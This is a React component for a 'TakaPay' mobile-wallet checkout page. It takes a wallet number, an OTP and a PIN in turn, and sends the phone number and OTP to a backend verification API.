import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';

const PaymentCheckout = () => {
  const { paymentId } = useParams();
  const [currentScreen, setCurrentScreen] = useState('account');
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    account: '',
    otp: '',
    pin: ''
  });
  const [error, setError] = useState('');
  const [timer, setTimer] = useState(10); // Starting timer at 10s
  const [canResend, setCanResend] = useState(false);

  // Handle input change for the fields
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    setError('');
  };

  // Handle Account Submit and save phone number in localStorage
  const handleAccountSubmit = async () => {
    setLoading(true);
    try {
      localStorage.setItem('phone', formData.account);

      const response = await fetch('https://quick-pay-96uq.onrender.com/api/wallet/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: formData.account })
      });
      const data = await response.json();
      if (data.success) {
        setCurrentScreen('otp');
      } else {
        setError(data.message || 'Verification failed');
      }
    } catch (err) {
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  // Handle OTP Submit and make the API call for OTP verification
  const handleOtpSubmit = async () => {
    setLoading(true);
    try {
      const phone = localStorage.getItem('phone');
      if (!phone) {
        setError('Phone number not found');
        return;
      }

      const response = await fetch('https://quick-pay-96uq.onrender.com/api/wallet/verifyOtp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, otp: formData.otp })
      });
      const data = await response.json();
      if (data.success) {
        setCurrentScreen('pin');
      } else {
        setError(data.message || 'OTP verification failed');
      }
    } catch (err) {
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  // Timer for OTP countdown
  useEffect(() => {
    if (currentScreen === 'otp' && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prevTimer) => {
          if (prevTimer === 1) {
            setCanResend(true);
          }
          return prevTimer - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [currentScreen, timer]);

  // Screens configuration
  const screens = {
    account: {
      title: 'Enter Wallet Number',
      placeholder: '01XXXXXXXXX',
      maxLength: 11,
      name: 'account',
      onConfirm: handleAccountSubmit,
      disabled: formData.account.length !== 11,
      input: formData.account
    },
    otp: {
      title: 'Enter 6 Digit OTP',
      placeholder: 'XXXXXX',
      maxLength: 6,
      name: 'otp',
      onConfirm: handleOtpSubmit,
      disabled: formData.otp.length !== 6,
      input: formData.otp
    },
    pin: {
      title: 'Enter PIN',
      placeholder: 'XXXXX',
      maxLength: 5,
      name: 'pin',
      onConfirm: () => console.log('Payment completed'),
      disabled: formData.pin.length !== 5,
      input: formData.pin
    }
  };

  const currentScreenData = screens[currentScreen];

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-200">
      <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-xl">
        {/* Header with Logo */}
        <div className="w-full h-[60px] mx-auto relative">
          <div className="absolute top-[-50px] left-1/2 transform -translate-x-1/2">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" className="w-20 h-20">
              <circle cx="50" cy="50" r="40" fill="#4CAF50" stroke="#4CAF50" strokeWidth="5" />
              <text x="50" y="45" fontFamily="Arial, sans-serif" fontSize="20" textAnchor="middle" fill="white">৳</text>
              <text x="50" y="70" fontFamily="Arial, sans-serif" fontSize="16" textAnchor="middle" fill="white">TakaPay</text>
            </svg>
          </div>
        </div>

        {/* Merchant Info */}
        <div className="flex items-center justify-between mt-4 mb-6 p-4 bg-gray-50 rounded-lg border border-gray-100 mx-6 w-11/12">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="150" height="150">
                <circle cx="12" cy="12" r="11" fill="#006a4e" />
                <circle cx="9" cy="12" r="4" fill="#f42a41" />
              </svg>
            </div>
            <div className="flex flex-col">
              <span className="font-medium text-gray-900">Sample Merchant</span>
            </div>
          </div>
          <div className="text-right">
            <p className="font-bold text-xl text-gray-900">ট 1000.00</p>
          </div>
        </div>

        {/* Input Section */}
        <div className="h-[230px] flex flex-col items-center justify-between mt-4 mb-6 p-4 bg-gray-50 rounded-lg border border-gray-100 mx-6 w-11/12" >
          <label className="text-gray-900 text-md mb-4 text-center">
            {currentScreenData.title}
          </label>
          <input
            type="text"
            name={currentScreenData.name}
            value={currentScreenData.input}
            onChange={handleInputChange}
            className="block w-full px-4 py-4 text-xl border rounded-lg text-center bg-white focus:border-[#4CAF50] focus:outline-[#4CAF50] focus:outline-2"
            placeholder={currentScreenData.placeholder}
            maxLength={currentScreenData.maxLength}
          />
          {error && (
            <div className="mt-4 text-red-500 text-center">{error}</div>
          )}
          {currentScreen === 'otp' && timer > 0 && (
            <p className="mt-4 text-sm text-red-700 text-center">Resend OTP in {timer}s</p>
          )}
          {currentScreen === 'otp' && timer === 0 && canResend && (
            <button
              onClick={handleOtpSubmit}
              className="mt-4 text-sm font-medium text-[#4CAF50] text-center"
            >
              Resend OTP
            </button>
          )}
          <div className="mt-4">
            <p className="text-sm text-gray-900 text-center">
              By confirm you agree to terms and conditions
            </p>
          </div>
        </div>

        {/* Buttons */}
        <div className="flex justify-between gap-4 w-11/12 mx-auto">
          <button
            className="w-11/12 mx-auto mt-6 py-4 px-6 rounded-lg font-medium transition-all duration-300 transform hover:scale-[0.99] flex items-center justify-center  bg-gray-100 text-gray-600 h-[50px]"
          >
            Cancel
          </button>
          <button
            className={`w-11/12 mx-auto mt-6 py-4 px-6 rounded-lg font-medium transition-all duration-300 transform hover:scale-[0.99] flex items-center justify-center text-white h-[50px] ${
              currentScreenData.disabled ? 'bg-gray-100 text-gray-400 cursor-not-allowed' : 'bg-[#4CAF50] hover:bg-[#45a049]'
            }`}
            onClick={currentScreenData.onConfirm}
            disabled={currentScreenData.disabled || loading}
          >
            {loading ? (
              <div className="flex gap-1">
                {[0,1,2].map(i => (
                  <span key={i} className="animate-bounce">&bull;</span>
                ))}
              </div>
            ) : 'Confirm'}
          </button>
        </div>

        {/* Footer */}
        <div className="m-6 pt-4 border-t border-gray-100">
          <p className="text-xs text-gray-500 text-center">
            Secured by TakaPay © 2025
          </p>
        </div>
      </div>
    </div>
  );
};

export default PaymentCheckout;
